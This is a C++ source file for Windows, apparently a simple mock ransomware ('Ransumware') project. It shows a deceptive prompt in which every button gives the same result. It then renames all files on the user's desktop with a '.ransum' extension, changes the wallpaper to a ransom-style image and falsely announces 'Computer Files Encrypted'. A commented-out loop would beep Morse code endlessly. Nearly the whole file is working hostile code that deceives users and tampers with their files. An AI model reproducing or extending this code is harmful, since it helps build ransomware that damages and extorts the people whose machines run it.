#include <windows.h>
#include <iostream>
#include <fstream>
#include <cstdio>
#include <vector>
#include <string>
#include <algorithm>
#include <filesystem>
#pragma warning(disable : 4996)

///////////////////////////////////////////////////////////////////////////
/////////////////////////////// Named Spaces //////////////////////////////
///////////////////////////////////////////////////////////////////////////
using namespace std;
namespace fs = std::filesystem;

///////////////////////////////////////////////////////////////////////////
//////////////////// Global Variables for the environment /////////////////
///////////////////////////////////////////////////////////////////////////

// User changable data, enter desired values //
std::string	intermediateString = "\\Desktop\\"; //This is for the target system's user desktop apth
std::string extensionString = "*"; //change the desired extension here. An '*' is required before the extension (i.e. "*.txt")
std::string replaceExtension = ".ransum"; //the extension to be replaced

int click;
string allUsers = "ALLUSERSPROFILE";
string appData = "APPDATA";
string comProgFiles = "CommonProgramFiles";
string comProgFiles86 = "CommonProgramFiles(x86)";
string computerName = "COMPUTERNAMES";
string comSpec = "ComSpec";
string driverData = "DriverData";
string homeDrive = "HOMEDRIVE";
string homePath = "HOMEPATH";
string localAppData = "LOCALAPPDATA";
string logonServer = "LOGONSERVER";
string numProcessors = "NUMBER_OF_PROCESSORS";
string os = "OS";
string path = "Path";
string procArch = "PROCESSOR_ARCHITECTURE";
string procID = "PROCESSOR_IDENTIFIER";
string procLevel = "PROCESSOR_LEVEL";
string procRev = "PROCESSOR_REVISION";
string progData = "ProgramData";
string progFiles = "ProgramFiles";
string progFiles86 = "ProgramFiles(x86)";
string pathPublic = "PUBLIC";
string sysDrive = "SystemDrive";
string sysRoot = "SystemRoot";
string temp = "TEMP";
string userDomain = "USERDOMAIN";
string userRoamingProf = "USERDOMAIN_ROAMINGPROFILE";
string userName = "USERNAME";
string userProfile = "USERPROFILE";
extern char** environ;

///////////////////////////////////////////////////////////////////////////
//////////////////////////// Vectors and Arrays ///////////////////////////
///////////////////////////////////////////////////////////////////////////

std::vector<char**> enviros;
std::vector<wstring> fileRename;


///////////////////////////////////////////////////////////////////////////
////////////////////////// Supporting Functions ///////////////////////////
///////////////////////////////////////////////////////////////////////////
void ChangeBackground() {
	const wchar_t* filenm = L"C:\\Users\\user\\Documents\\LockYoShit.jpg";
	SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, (void*)filenm, SPIF_UPDATEINIFILE);
}


///////////////////////////////////////////////////////////////////////////
////////////////////////////// Main Function //////////////////////////////
///////////////////////////////////////////////////////////////////////////
int main()
{
	{
		// Message box tricks the user into selecting and option. //
		int msgboxID = MessageBox(
			NULL,
			(LPCWSTR)L"Would you like to install the program?",
			(LPCWSTR)L"Ransumware detected!",
			MB_ICONQUESTION | MB_YESNOCANCEL | MB_DEFBUTTON2
		);

		// This switch statement enacts the rest of the code below, regardless of selection. //
		switch (msgboxID)
		{
		case IDYES:
			click = 1;
			break;
		case IDNO:
			click = 1;
			break;
		case IDCANCEL:
			click = 1;
			break;
		}
	}

	if (click == 1)
	{
		// Changes Background

		// The goal for the code section below is to search through the complete list of environmental
		// variables until you find the one you want.  Take the output, strip off everything to the left, including
		// the equal sign and find files on the desktop as an example.  Current Status: NOT COMPLETE.




		// The next section, getenv, can only accept char* inputs.  The next section of code will convert it from a
		//string value into a char function in order to render an output.
		const char* strConvDrive = userProfile.c_str(); //converts established variable to char
		char* varDrive = getenv(strConvDrive); //uses the char to get the environmental variable

		// Conversion //
		std::string strName = std::string(varDrive) + std::string(intermediateString) + std::string(extensionString); //converts the environmental variable to a string with intermediate string and extension
		std::wstring temp = std::wstring(strName.begin(), strName.end()); //converts strName into a wide string with extension
		LPCWSTR lpcwstr1 = temp.c_str(); //Converts the wide string into a LPCWSTR pointer for use below
		std::string sPath = std::string(varDrive) + std::string(intermediateString); //converts the environmental variable to a string WITHOUT extension
		std::wstring wPath = std::wstring(sPath.begin(), sPath.end()); //converts the string into a wide string WITHOUT extension
		std::wstring wReplaceExtension = std::wstring(replaceExtension.begin(), replaceExtension.end()); //converts the desired extension into a wstring

		//test outputs //
		//cout << "strName: " << strName << endl;
		//wcout << "temp: " << temp << endl;
		//cout << "sPath: " << sPath << endl;
		//wcout << "wPath: " << wPath << endl;
		//wcout << "wReplaceExtension: " << wReplaceExtension << endl;


		// Finding files that end in the extension from the path provided above.

		WIN32_FIND_DATA FindFileData;
		HANDLE hFindFile;

		// Finding first 
		hFindFile = FindFirstFile(lpcwstr1, &FindFileData);
		if (INVALID_HANDLE_VALUE == hFindFile)
		{
			cout << "Error in Finding File" << endl; //Prints string
			cout << "Error - " << GetLastError() << endl; //Shows error and gets the error and prints to screen
		}
		else
		{
		std:wstring firstFullPath = std::wstring(wPath) + std::wstring(FindFileData.cFileName); //combines first file path with the file name plus extension
			fs::path p = firstFullPath; //the full first file path with the extension
			fileRename.push_back(p); //places each iteration into a vector
		}

		while (FindNextFile(hFindFile, &FindFileData))
		{
			std::wstring restFullPath = std::wstring(wPath) + std::wstring(FindFileData.cFileName); //combines nth file path with the file name plus extension
			fs::path p = restFullPath; //the full nth file path with the extension
			fileRename.push_back(p); //places each iteration into a vector
		}
		FindClose(hFindFile);

		for (int i = 0; i < fileRename.size(); i++) {
			wstring filePath = fileRename[i]; //gets the iterative file path in the for loop as a wstring
			wstring ransumFile = filePath + wReplaceExtension; //combines filepath and replacement extension
			wchar_t* cFilePath = _wcsdup(filePath.c_str()); //file path string conversion
			wchar_t* cRansumFile = _wcsdup(ransumFile.c_str()); //file extension conversion 
			_wrename(cFilePath, cRansumFile); //renames the file (old file, new file)
			free(cFilePath); //releases memory pointer
			free(cRansumFile); //releases memory pointer
		}



		//add file changing .txt and .pdf extension changes

		//Message box after selecting any option.  The result is the same another message box with the given words
		int msgboxID = MessageBox(
			NULL,
			(LPCWSTR)L"Computer Files Encrypted: ",
			(LPCWSTR)L"You Didn't say the Magic Word",
			MB_ICONSTOP | MB_OK | MB_DEFBUTTON2
		);
	}
	ChangeBackground();
	return 0;
}

/*

// Nearly endless repeating 'NRT' morse code.  This is desiged to just be about as annoying
// as it can get. //

int i = 0;
int dit = 50;
int dah = dit * 3;
int symbolSleep = dit;
int letterSleep = dah;
int wordSleep = dit * 7;

while (i < 2000000000)
{
	//N morse code length
	Beep(523, dah);
	Sleep(symbolSleep);
	Beep(523, dit);
	std::cout << "N";
	Sleep(letterSleep);
	//R morse code Length
	Beep(523, dit);
	Sleep(symbolSleep);
	Beep(523, dah);
	Sleep(symbolSleep);
	Beep(523, dit);
	std::cout << "R";
	Sleep(letterSleep);
	//T Morse Code Length
	Beep(523, dah);
	std::cout << "T\n";

	std::cout << i << endl;
	i++;
	Sleep(wordSleep);
}
*/




